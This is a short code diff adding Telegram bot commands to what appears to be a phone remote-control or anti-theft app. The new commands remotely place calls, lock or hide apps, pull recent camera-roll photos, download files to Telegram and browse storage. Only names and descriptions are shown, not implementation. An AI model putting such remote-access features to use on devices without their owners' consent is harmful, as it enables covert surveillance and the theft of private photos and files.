@@ -78,6 +78,12 @@ const commandsList = [
   { command: "license", description: "🔑 Check Pro license status or activate key" },
   { command: "check_update", description: "🔄 Check for OTA app updates" },
   { command: "update_confirm", description: "⚡ Download and install pending OTA update" },
+  { command: "call", description: "📞 Remotely place outbound cellular phone call" },
+  { command: "lock_app", description: "🧊 Freeze gallery, phone, files, or sensitive app" },
+  { command: "unlock_app", description: "☀️ Restore locked/hidden application" },
+  { command: "gallery_latest", description: "🖼️ Extract recent photos from camera roll" },
+  { command: "getfile", description: "📁 Download file from storage directly to Telegram" },
+  { command: "list_files", description: "📂 Browse files in device storage directory" },
   { command: "wipe", description: "⚠️ Emergency remote factory reset (requires auth)" },
   { command: "wipe_confirm", description: "💥 Confirm remote factory reset with password" }
 ];
